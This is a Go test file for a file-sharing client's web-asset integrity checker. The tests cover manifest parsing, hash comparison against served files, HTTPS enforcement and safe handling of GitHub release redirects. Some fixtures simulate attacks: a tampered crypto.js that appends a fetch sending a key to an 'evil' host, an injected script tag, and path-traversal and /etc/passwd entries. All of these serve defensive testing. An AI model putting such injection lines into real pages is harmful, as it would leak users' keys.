package safeshare

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// webDir is the server's embedded web root in this repository.
const webDir = "../../internal/static/web"

func sum(b []byte) string {
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

// repoManifest builds the manifest scripts/web-asset-hashes.sh would print.
func repoManifest(t *testing.T) (map[string]string, map[string][]byte) {
	t.Helper()
	m, files := map[string]string{}, map[string][]byte{}
	err := filepath.WalkDir(webDir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel(webDir, p)
		rel = filepath.ToSlash(rel)
		data, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		m[rel], files[rel] = sum(data), data
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return m, files
}

func manifestText(m map[string]string) []byte {
	var names []string
	for n := range m {
		names = append(names, n)
	}
	sort.Strings(names)
	var b bytes.Buffer
	for _, n := range names {
		fmt.Fprintf(&b, "%s  %s\n", m[n], n)
	}
	return b.Bytes()
}

func TestAssetRouteCoversEveryEmbeddedFile(t *testing.T) {
	m, _ := repoManifest(t)
	for f := range m {
		if _, _, skip := assetRoute(f); skip == "no known URL" {
			t.Errorf("%s has no URL in assetRoute; add it (see cmd/safeshare/main.go routes)", f)
		}
	}
	for _, f := range []string{"index.html", "login.html", "service-worker.js", "service-worker-anonymous.js", "assets/app.js", "assets/crypto.js"} {
		if _, ok := m[f]; !ok {
			t.Errorf("expected %s in the web root", f)
		}
	}
}

func TestParseWebAssetManifest(t *testing.T) {
	h := strings.Repeat("ab", 32)
	good := h + "  index.html\r\n" + h + " *assets/app.js\n\n"
	m, err := ParseWebAssetManifest([]byte(good))
	if err != nil {
		t.Fatal(err)
	}
	if len(m) != 2 || m["assets/app.js"] != h {
		t.Fatalf("got %v", m)
	}

	bad := map[string]string{
		"no index":     h + "  assets/app.js\n",
		"short hash":   "abc  index.html\n",
		"upper hex":    strings.ToUpper(h) + "  index.html\n",
		"dotdot":       h + "  index.html\n" + h + "  assets/../x\n",
		"absolute":     h + "  index.html\n" + h + "  /etc/passwd\n",
		"empty seg":    h + "  index.html\n" + h + "  assets//x\n",
		"backslash":    h + "  index.html\n" + h + "  assets\\x\n",
		"space in nm":  h + "  index.html\n" + h + "  a b\n",
		"duplicate":    h + "  index.html\n" + h + "  index.html\n",
		"one space":    h + " index.html\n",
		"html page":    "<html>\n",
		"empty":        "",
		"trailing dir": h + "  index.html\n" + h + "  assets/\n",
	}
	for name, in := range bad {
		if _, err := ParseWebAssetManifest([]byte(in)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if _, err := ParseWebAssetManifest(bytes.Repeat([]byte("x"), maxManifestSize+1)); err == nil {
		t.Error("oversized manifest accepted")
	}
}

// assetServer serves the repo's web files at the server's routes. anonymous
// switches the service worker to the kill switch and hides the app manifest.
type assetServer struct {
	files     map[string][]byte
	anonymous bool
	override  map[string]func(w http.ResponseWriter, r *http.Request)
	sawAuth   bool
}

func (s *assetServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("Authorization") != "" || r.Header.Get("Cookie") != "" {
		s.sawAuth = true
	}
	if h, ok := s.override[r.URL.Path]; ok {
		h(w, r)
		return
	}
	var name string
	switch p := r.URL.Path; {
	case p == "/api/config":
		_, _ = io.WriteString(w, `{"version":"1.17.0"}`)
		return
	case p == "/":
		name = "index.html"
	case p == "/login":
		name = "login.html"
	case p == "/admin/login":
		name = "admin/login.html"
	case p == "/service-worker.js" && s.anonymous:
		name = "service-worker-anonymous.js"
	case p == "/service-worker.js":
		name = "service-worker.js"
	case p == "/assets/manifest.json" && s.anonymous:
		http.NotFound(w, r)
		return
	case strings.HasPrefix(p, "/assets/"), strings.HasPrefix(p, "/admin/assets/"):
		name = strings.TrimPrefix(p, "/")
	}
	data, ok := s.files[name]
	if !ok {
		http.NotFound(w, r)
		return
	}
	_, _ = w.Write(data)
}

func verifyAgainst(t *testing.T, s *assetServer, m map[string]string) *WebAssetReport {
	t.Helper()
	srv := httptest.NewServer(s)
	t.Cleanup(srv.Close)
	c, err := NewClient(ClientConfig{BaseURL: srv.URL, APIToken: "safeshare_secret", DisableProxy: true})
	if err != nil {
		t.Fatal(err)
	}
	report, err := c.VerifyWebAssets(context.Background(), m)
	if err != nil {
		t.Fatal(err)
	}
	return report
}

func statusOf(r *WebAssetReport, file string) (AssetResult, bool) {
	for _, a := range r.Results {
		if a.File == file {
			return a, true
		}
	}
	return AssetResult{}, false
}

func TestVerifyWebAssetsUntouched(t *testing.T) {
	m, files := repoManifest(t)
	for _, anonymous := range []bool{false, true} {
		s := &assetServer{files: files, anonymous: anonymous}
		r := verifyAgainst(t, s, m)
		if !r.Verified() || r.Tampered() {
			for _, a := range r.Results {
				t.Logf("%s %s %s", a.Status, a.File, a.Detail)
			}
			t.Fatalf("anonymous=%v: untouched server not verified", anonymous)
		}
		sw, _ := statusOf(r, "service-worker.js")
		if anonymous {
			sw, _ = statusOf(r, "service-worker-anonymous.js")
		}
		if sw.Status != AssetMatch {
			t.Errorf("anonymous=%v: service worker %v", anonymous, sw.Status)
		}
		if mj, _ := statusOf(r, "assets/manifest.json"); anonymous && mj.Status != AssetNotServed {
			t.Errorf("Ghost manifest.json: %v, want not served", mj.Status)
		}
		for _, f := range []string{"dashboard.html", "admin/dashboard.html", "error.html"} {
			if a, _ := statusOf(r, f); a.Status != AssetNotChecked {
				t.Errorf("%s: %v, want not checked", f, a.Status)
			}
		}
		if s.sawAuth {
			t.Error("verification sent the API token or a cookie")
		}
	}
}

func TestVerifyWebAssetsDetectsChanges(t *testing.T) {
	m, files := repoManifest(t)
	cases := map[string]struct {
		path    string
		handler func(w http.ResponseWriter, r *http.Request)
		file    string
		want    AssetStatus
	}{
		"tampered script": {"/assets/crypto.js", func(w http.ResponseWriter, r *http.Request) {
			_, _ = w.Write(append(files["assets/crypto.js"], []byte("\nfetch('//evil/'+key)")...))
		}, "assets/crypto.js", AssetMismatch},
		"tampered page": {"/", func(w http.ResponseWriter, r *http.Request) {
			_, _ = w.Write(bytes.Replace(files["index.html"], []byte("</head>"), []byte("<script>x()</script></head>"), 1))
		}, "index.html", AssetMismatch},
		"other worker": {"/service-worker.js", func(w http.ResponseWriter, r *http.Request) {
			_, _ = io.WriteString(w, "self.addEventListener('fetch', e => {})")
		}, "service-worker.js", AssetMismatch},
		"required 404": {"/assets/app.js", http.NotFound, "assets/app.js", AssetMissing},
		"optional 404": {"/admin/login", http.NotFound, "admin/login.html", AssetNotServed},
		"redirect": {"/login", func(w http.ResponseWriter, r *http.Request) {
			http.Redirect(w, r, "/dashboard", http.StatusFound)
		}, "login.html", AssetFetchFailed},
		"challenge page": {"/assets/app.js", func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusForbidden)
		}, "assets/app.js", AssetFetchFailed},
		"brotli": {"/assets/app.js", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Encoding", "br")
			_, _ = w.Write([]byte("xx"))
		}, "assets/app.js", AssetFetchFailed},
		"cdn injects into pages": {"/", func(w http.ResponseWriter, r *http.Request) {
			// Like Cloudflare Web Analytics: only for requests that look like a browser opening a page.
			page := files["index.html"]
			if strings.Contains(r.Header.Get("Accept"), "text/html") {
				page = bytes.Replace(page, []byte("</body>"), []byte("<script src=\"https://static.cloudflareinsights.com/beacon.min.js\"></script></body>"), 1)
			}
			_, _ = w.Write(page)
		}, "index.html", AssetMismatch},
		"gzip anyway": {"/assets/app.js", func(w http.ResponseWriter, r *http.Request) {
			if r.Header.Get("Accept-Encoding") != "identity" {
				t.Errorf("Accept-Encoding = %q", r.Header.Get("Accept-Encoding"))
			}
			w.Header().Set("Content-Encoding", "gzip")
			zw := gzip.NewWriter(w)
			_, _ = zw.Write(files["assets/app.js"])
			_ = zw.Close()
		}, "assets/app.js", AssetMatch},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			s := &assetServer{files: files, override: map[string]func(http.ResponseWriter, *http.Request){tc.path: tc.handler}}
			r := verifyAgainst(t, s, m)
			a, ok := statusOf(r, tc.file)
			if !ok || a.Status != tc.want {
				t.Fatalf("%s: %v (%s), want %v", tc.file, a.Status, a.Detail, tc.want)
			}
			wantTampered := tc.want == AssetMismatch
			if r.Tampered() != wantTampered {
				t.Errorf("Tampered() = %v", r.Tampered())
			}
			wantVerified := tc.want == AssetMatch || tc.want == AssetNotServed
			if r.Verified() != wantVerified {
				t.Errorf("Verified() = %v, want %v", r.Verified(), wantVerified)
			}
		})
	}
}

func TestVerifyWebAssetsOversized(t *testing.T) {
	m, files := repoManifest(t)
	s := &assetServer{files: files, override: map[string]func(http.ResponseWriter, *http.Request){
		"/assets/app.js": func(w http.ResponseWriter, r *http.Request) {
			_, _ = io.CopyN(w, zeroReader{}, maxAssetSize+10)
		},
	}}
	r := verifyAgainst(t, s, m)
	if a, _ := statusOf(r, "assets/app.js"); a.Status != AssetFetchFailed {
		t.Fatalf("oversized body: %v", a.Status)
	}
}

type zeroReader struct{}

func (zeroReader) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = 0
	}
	return len(p), nil
}

func TestVerifyWebAssetsRefusesPlainHTTP(t *testing.T) {
	m := map[string]string{"index.html": strings.Repeat("0", 64)}
	for _, u := range []string{"http://share.example.com", "http://10.0.0.1:8080", "http://localhost.evil.com"} {
		c, err := NewClient(ClientConfig{BaseURL: u, DisableProxy: true})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := c.VerifyWebAssets(context.Background(), m); err == nil {
			t.Errorf("%s: plain http accepted", u)
		}
	}
	for host, want := range map[string]bool{
		"abc.onion": true, "ABC.ONION.": true, "localhost": true, "a.localhost": true,
		"127.0.0.1": true, "127.9.9.9": true, "::1": true,
		"onion.com": false, "10.0.0.1": false, "example.com": false, "localhost.evil.com": false,
	} {
		if got := onionOrLoopback(host); got != want {
			t.Errorf("onionOrLoopback(%q) = %v", host, got)
		}
	}
}

// githubTransport answers requests to GitHub hosts from a table, recording
// what was asked.
type githubTransport struct {
	routes map[string]func(r *http.Request) *http.Response
	seen   []string
}

func (g *githubTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	g.seen = append(g.seen, r.URL.String())
	if r.Header.Get("Authorization") != "" {
		return nil, fmt.Errorf("token sent to %s", r.URL.Host)
	}
	if h, ok := g.routes[r.URL.String()]; ok {
		return h(r), nil
	}
	return &http.Response{StatusCode: 404, Body: io.NopCloser(strings.NewReader("")), Header: http.Header{}, Request: r}, nil
}

func resp(r *http.Request, code int, body string, hdr ...string) *http.Response {
	h := http.Header{}
	for i := 0; i+1 < len(hdr); i += 2 {
		h.Set(hdr[i], hdr[i+1])
	}
	return &http.Response{StatusCode: code, Body: io.NopCloser(strings.NewReader(body)), Header: h, Request: r}
}

func githubClientFor(t *testing.T, g *githubTransport) *Client {
	t.Helper()
	c, err := NewClient(ClientConfig{BaseURL: "https://share.example.com", APIToken: "safeshare_secret", DisableProxy: true})
	if err != nil {
		t.Fatal(err)
	}
	c.httpClient.Transport = g
	return c
}

func TestFetchReleaseManifest(t *testing.T) {
	const dl = "https://github.com/fjmerc/safeshare/releases/download/v1.17.0/web-assets.sha256"
	const obj = "https://release-assets.githubusercontent.com/x"
	g := &githubTransport{routes: map[string]func(*http.Request) *http.Response{
		dl:  func(r *http.Request) *http.Response { return resp(r, 302, "", "Location", obj) },
		obj: func(r *http.Request) *http.Response { return resp(r, 200, "manifest") },
	}}
	c := githubClientFor(t, g)
	data, err := c.FetchReleaseManifest(context.Background(), "", "1.17.0")
	if err != nil || string(data) != "manifest" {
		t.Fatalf("got %q, %v", data, err)
	}

	// Redirects only to GitHub's https hosts.
	for _, loc := range []string{"https://evil.example.com/x", "http://release-assets.githubusercontent.com/x", "https://githubusercontent.com.evil.com/x"} {
		g.routes[dl] = func(r *http.Request) *http.Response { return resp(r, 302, "", "Location", loc) }
		if _, err := c.FetchReleaseManifest(context.Background(), "", "1.17.0"); err == nil {
			t.Errorf("followed redirect to %s", loc)
		}
	}

	if _, err := c.FetchReleaseManifest(context.Background(), "", "1.16.0"); !IsNoManifest(err) {
		t.Errorf("missing manifest: %v", err)
	}
	for _, v := range []string{"", "v1.17.0", "1.17", "1.17.0/../../x", "1.17.0?x"} {
		if _, err := c.FetchReleaseManifest(context.Background(), "", v); err == nil {
			t.Errorf("version %q accepted", v)
		}
	}
	for _, repo := range []string{"fjmerc", "a/b/c", "../x", "a/..", "a/b?x", "https://github.com/a/b"} {
		if _, err := c.FetchReleaseManifest(context.Background(), repo, "1.17.0"); err == nil {
			t.Errorf("repo %q accepted", repo)
		}
	}
	for _, u := range g.seen {
		if !strings.HasPrefix(u, "https://github.com/fjmerc/safeshare/") && !strings.HasPrefix(u, "https://release-assets.githubusercontent.com/") {
			t.Errorf("requested %s", u)
		}
	}
}

func TestLatestReleaseVersion(t *testing.T) {
	const latest = "https://github.com/fjmerc/safeshare/releases/latest"
	cases := map[string]struct {
		loc  string
		want string
	}{
		"ok":         {"https://github.com/fjmerc/safeshare/releases/tag/v1.18.0", "1.18.0"},
		"relative":   {"/fjmerc/safeshare/releases/tag/v1.18.0", "1.18.0"},
		"other repo": {"https://github.com/evil/safeshare/releases/tag/v9.9.9", ""},
		"other host": {"https://evil.com/fjmerc/safeshare/releases/tag/v9.9.9", ""},
		"junk tag":   {"https://github.com/fjmerc/safeshare/releases/tag/v1.18.0/../x", ""},
		"no release": {"https://github.com/fjmerc/safeshare/releases", ""},
	}
	for name, tc := range cases {
		g := &githubTransport{routes: map[string]func(*http.Request) *http.Response{
			latest: func(r *http.Request) *http.Response { return resp(r, 302, "", "Location", tc.loc) },
		}}
		got, err := githubClientFor(t, g).LatestReleaseVersion(context.Background(), "")
		if tc.want == "" {
			if err == nil {
				t.Errorf("%s: accepted %q", name, got)
			}
			continue
		}
		if err != nil || got != tc.want {
			t.Errorf("%s: got %q, %v", name, got, err)
		}
		if len(g.seen) != 1 {
			t.Errorf("%s: followed the redirect: %v", name, g.seen)
		}
	}
}

func TestLooseScriptPolicy(t *testing.T) {
	cases := map[string]string{
		"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'": "",
		"default-src 'self'": "",
		"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net": "'unsafe-inline' https://cdn.jsdelivr.net",
		"script-src 'SELF' 'unsafe-eval'":                                                "'unsafe-eval'",
		"script-src 'self'; script-src *":                                                "",
		"style-src 'self'":                                                               "missing",
		"":                                                                               "missing",
	}
	for csp, want := range cases {
		r := &WebAssetReport{PageCSP: csp}
		if got := strings.Join(r.LooseScriptPolicy(), " "); got != want {
			t.Errorf("%q: got %q, want %q", csp, got, want)
		}
	}
}

func TestVerifyWebAssetsRecordsPageCSP(t *testing.T) {
	m, files := repoManifest(t)
	const csp = "default-src 'self'; script-src 'self' https://cdn.example"
	s := &assetServer{files: files, override: map[string]func(http.ResponseWriter, *http.Request){
		"/": func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Security-Policy", csp)
			_, _ = w.Write(files["index.html"])
		},
	}}
	r := verifyAgainst(t, s, m)
	if r.PageCSP != csp || strings.Join(r.LooseScriptPolicy(), " ") != "https://cdn.example" {
		t.Fatalf("PageCSP = %q, loose = %v", r.PageCSP, r.LooseScriptPolicy())
	}
}
